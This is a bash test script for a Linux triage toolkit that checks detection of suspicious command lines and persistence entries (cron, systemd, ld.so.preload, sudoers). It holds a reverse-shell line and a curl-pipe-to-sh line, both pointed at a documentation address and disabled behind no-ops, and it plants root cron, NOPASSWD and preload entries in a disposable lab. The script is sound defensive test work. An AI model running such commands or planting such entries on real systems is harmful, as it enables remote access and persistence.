#!/usr/bin/env bash
# TATAR Triage Toolkit - new Linux detections (command lines, cron/systemd targets,
# ld.so.preload, shell startup files, sudoers).
#
# The process check runs anywhere: it starts a harmless sleeper whose command
# line carries a reverse-shell pattern behind a ':' no-op, and a plain sleeper
# as the control. The checks that need to write system files run only as root
# on a machine you can throw away: set TATAR_LAB=disposable. They add one file
# each, run the collector, and remove the file again.
#
# Run from the repo root:   bash tests/test-linux-detections.sh
# Exit code: 0 = all checks passed, 1 = at least one failed.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
COLLECTOR="${1:-$HERE/../linux/tatar-linux.sh}"
command -v python3 >/dev/null 2>&1 || { echo "SKIP  python3 is needed to read findings.json"; exit 0; }
W="$(mktemp -d)"; PIDS=""; CLEAN=""
cleanup() { for p in $PIDS; do kill -9 "$p" 2>/dev/null; done; for f in $CLEAN; do rm -rf "$f" 2>/dev/null; done; rm -rf "$W"; }
trap cleanup EXIT
PASS=0; FAIL=0
check() { if [ "$2" = 1 ]; then PASS=$((PASS+1)); printf '  PASS  %s\n' "$1"; else FAIL=$((FAIL+1)); printf '  FAIL  %s  %s\n' "$1" "${3:-}"; fi; }

# run MODULES TAG -> findings.json path in $RUNJSON
run() {
    local out="$W/out-$2"
    timeout 150 bash "$COLLECTOR" --modules "$1" --silent --output "$out" >"$W/$2.log" 2>&1
    RUNJSON="$(ls -d "$out"/*/ 2>/dev/null | head -n1)findings.json"
}
# count TAG-less: findings whose message contains $1
count() { python3 -c 'import json,sys; d=json.load(open(sys.argv[1],encoding="utf-8")); print(sum(1 for f in d["findings"] if sys.argv[2] in f.get("message","")))' "$RUNJSON" "$1" 2>/dev/null || echo -1; }

# --- process command lines (any user) ---
bash -c 'sleep 90; : bash -i >& /dev/tcp/203.0.113.9/4444' & PIDS="$PIDS $!"
bash -c 'sleep 90; : curl http://203.0.113.9/x.sh | sh' & PIDS="$PIDS $!"
sleep 1
run process hit
check "reverse-shell command line is reported"       "$([ "$(count 'reverse shell or pipe-to-shell')" -ge 2 ] && echo 1 || echo 0)" "got $(count 'reverse shell or pipe-to-shell')"
for p in $PIDS; do kill -9 "$p" 2>/dev/null; done; PIDS=""
sleep 1
bash -c 'sleep 90; : plain control' & PIDS="$PIDS $!"
sleep 1
run process ctl
check "control run: no command-line finding (collector does not flag itself)" "$([ "$(count 'reverse shell or pipe-to-shell')" = 0 ] && echo 1 || echo 0)" "got $(count 'reverse shell or pipe-to-shell')"

# --- finding ids are unique (any user) ---
run process,network,indicators,sessions,users ids-any
check "every finding id in a run is different" "$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1],encoding="utf-8"))["findings"]; ids=[f["id"] for f in d]; print(1 if len(set(ids))==len(ids) else 0)' "$RUNJSON")"

# --- privileged checks ---
if [ "$(id -u)" = 0 ] && [ "${TATAR_LAB:-}" = disposable ]; then
    # ld.so.preload
    if [ ! -e /etc/ld.so.preload ]; then
        printf '/usr/lib/libtatar-lab-none.so\n' > /etc/ld.so.preload; CLEAN="$CLEAN /etc/ld.so.preload"
        run persistence preload
        check "ld.so.preload entry is High" "$([ "$(count 'ld.so.preload')" -ge 1 ] && echo 1 || echo 0)"
        rm -f /etc/ld.so.preload; CLEAN=""
        run persistence preload-ctl
        check "ld.so.preload removed: finding gone" "$([ "$(count 'ld.so.preload')" = 0 ] && echo 1 || echo 0)"
    fi
    # cron
    printf '* * * * * root /tmp/tatar-lab-cron.sh\n' > /etc/cron.d/tatar-lab; CLEAN="$CLEAN /etc/cron.d/tatar-lab"
    run persistence cron
    check "cron entry running from /tmp is reported" "$([ "$(count 'Cron entry runs a program from a temporary directory')" -ge 1 ] && echo 1 || echo 0)"
    rm -f /etc/cron.d/tatar-lab; CLEAN=""
    # systemd unit
    printf '[Service]\nExecStart=/tmp/tatar-lab-unit\n' > /etc/systemd/system/tatar-lab.service; CLEAN="$CLEAN /etc/systemd/system/tatar-lab.service"
    run persistence unit
    check "systemd unit starting from /tmp is reported" "$([ "$(count 'systemd unit starts a program from a temporary directory')" -ge 1 ] && echo 1 || echo 0)"
    rm -f /etc/systemd/system/tatar-lab.service; CLEAN=""
    # sudoers
    printf 'tatarlab ALL=(ALL) NOPASSWD: ALL\n' > /etc/sudoers.d/tatar-lab; chmod 440 /etc/sudoers.d/tatar-lab; CLEAN="$CLEAN /etc/sudoers.d/tatar-lab"
    run indicators sudo
    check "sudoers NOPASSWD is reported" "$([ "$(count 'sudoers grants NOPASSWD')" -ge 1 ] && echo 1 || echo 0)"
    rm -f /etc/sudoers.d/tatar-lab; CLEAN=""
    # finding ids: two findings raised from pipelines in one run must not share an id
    printf '* * * * * root /tmp/tatar-lab-cron.sh\n' > /etc/cron.d/tatar-lab; CLEAN="$CLEAN /etc/cron.d/tatar-lab"
    printf '[Service]\nExecStart=/tmp/tatar-lab-unit\n' > /etc/systemd/system/tatar-lab.service; CLEAN="$CLEAN /etc/systemd/system/tatar-lab.service"
    run persistence ids
    check "two findings from pipelines in one run carry different ids" "$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1],encoding="utf-8"))["findings"]; ids=[f["id"] for f in d]; print(1 if len(d)>=2 and len(set(ids))==len(ids) else 0)' "$RUNJSON")" "ids: $(python3 -c 'import json,sys; print([f["id"] for f in json.load(open(sys.argv[1],encoding="utf-8"))["findings"]])' "$RUNJSON")"
    rm -f /etc/cron.d/tatar-lab /etc/systemd/system/tatar-lab.service; CLEAN=""
else
    echo "  SKIP  privileged checks (need root and TATAR_LAB=disposable)"
fi

echo; echo "RESULT  passed: $PASS  failed: $FAIL"
[ "$FAIL" = 0 ]
